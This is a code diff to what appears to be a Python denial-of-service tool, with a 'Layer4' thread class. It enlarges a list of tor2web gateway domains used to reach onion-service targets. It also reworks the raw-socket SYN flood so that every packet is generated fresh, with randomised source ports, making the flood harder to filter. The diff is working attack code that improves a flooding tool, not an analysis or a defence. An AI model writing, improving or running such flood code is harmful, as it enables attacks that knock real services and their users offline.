@@ -48,7 +48,43 @@ ctx.verify_mode = CERT_NONE
 __version__: str = "2.4 SNAPSHOT"
 __dir__: Path = Path(__file__).parent
 __ip__: Any = None
-tor2webs = ['onion.ly', 'tor2web.to', 'onion.org', 'onion.pet', 'onion.ws', 'onion.top', 'onion.dog']
+tor2webs = [
+            'onion.city',
+            'onion.cab',
+            'onion.direct',
+            'onion.sh',
+            'onion.link',
+            'onion.ws',
+            'onion.pet',
+            'onion.rip',
+            'onion.plus',
+            'onion.top',
+            'onion.si',
+            'onion.ly',
+            'onion.my',
+            'onion.sh',
+            'onion.lu',
+            'onion.casa',
+            'onion.com.de',
+            'onion.foundation',
+            'onion.rodeo',
+            'onion.lat',
+            'tor2web.org',
+            'tor2web.fi',
+            'tor2web.blutmagie.de',
+            'tor2web.to',
+            'tor2web.io',
+            'tor2web.in',
+            'tor2web.it',
+            'tor2web.xyz',
+            'tor2web.su',
+            'darknet.to',
+            's1.tor-gateways.de',
+            's2.tor-gateways.de',
+            's3.tor-gateways.de',
+            's4.tor-gateways.de',
+            's5.tor-gateways.de'
+        ]
 
 with open(__dir__ / "config.json") as f:
     con = load(f)
@@ -485,11 +521,10 @@ class Layer4(Thread):
         Tools.safe_close(s)
 
     def SYN(self) -> None:
-        payload = self._genrate_syn()
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, payload, self._target):
+            while Tools.sendto(s, self._genrate_syn(), self._target):
                 continue
         Tools.safe_close(s)
 
@@ -569,7 +604,7 @@ class Layer4(Thread):
         tcp.set_SYN()
         tcp.set_th_flags(0x02)
         tcp.set_th_dport(self._target[1])
-        tcp.set_th_sport(ProxyTools.Random.rand_int(1, 65535))
+        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
         ip.contains(tcp)
         return ip.get_packet()
 
